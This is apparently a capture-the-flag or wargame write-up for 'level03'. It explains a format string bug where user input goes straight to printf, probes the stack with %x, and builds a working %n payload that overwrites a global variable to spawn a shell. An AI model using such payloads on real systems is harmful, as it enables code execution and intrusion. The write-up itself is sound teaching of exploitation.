# String Attack

## Vuln

Passing a buffer write by user as argument to printf is a serious vulnerabilty.

```c
  char local_20c [520];

  fgets(local_20c,0x200,stdin);
  printf(local_20c);
```

If you don't provide arg, and if u pass for example %x to prinf, it will read and print hexa from the next address on the stack.

You can print the entire stack. And read data.

![img](/level03/ressources/error_printf.svg)
[website docu](https://axcheron.github.io/exploit-101-format-strings/)

## Write ?

Did you know, we cant write into data with printf ? `%n` do it.

```c
printf("AAAA%n", (int)a);
```

Will write, 4 in a.

4 because, it takes the value of 'AAAA' which is 4 bytes.

## m data ?

```c
  if (m == 0x40) {
    fwrite("Wait what?!\n",1,0xc,stdout);
    system("/bin/sh");
  }
```

m is a global variable, visible in the .bss section (Uninitialized data).

```bash
$> objdump -D level3 | grep -A 2 '<m>'
0804988c <m>:
 804988c:	00 00                	add    %al,(%eax)
```

To make it work, we need overwrite m at address 0x0804988c equal to 0x40.

## Exploit

I need write in the buffer the address of the m data, point on it with %x$n (where 'x' is a integer) and write 0x40 byte inside.

`%6$x` mean print int hexa, the 6th argument (so 6th address on the stack).

because if i do that:

```bash
$> python3 -c 'print("\x8c\x98\x04\x08" + "%n")' | ./level3
       14337 segmentation fault (core dumped)  ./level3
```

of course it seg fault, it try write 4 byte into first argument on the stack. We need to find the start of the buffer where we write the exact address of the m data.

```bash
$> ./level3
AAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.

AAAA00000200.f7e26620.00000000.41414141.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838.
```

Bingo, we find where on the stack is store the buffer `41414141` is hexa for `A` char.

Now if we write address of m, and pass %4$n, it will write 4 into m.

```bash
python2.7 -c 'import sys; sys.stdout.write(b"\x8c\x98\x04\x08" + b"%4$n")' | ./level3
```

(m = 4);

Final step is to pass to the payload an offset for print the value we want. We cant do it with : ```%<y>x``` (where y is an integer).

For example `printf("%2x")` will print two space;

So final payload is: 

```bash
cat <(python2.7 -c 'import sys; sys.stdout.write(b"\x8c\x98\x04\x08"+ b"%60x" + b"%4$n")') -| ./level3
```

address + offset(64 / 0x40) - len(address) + %4$n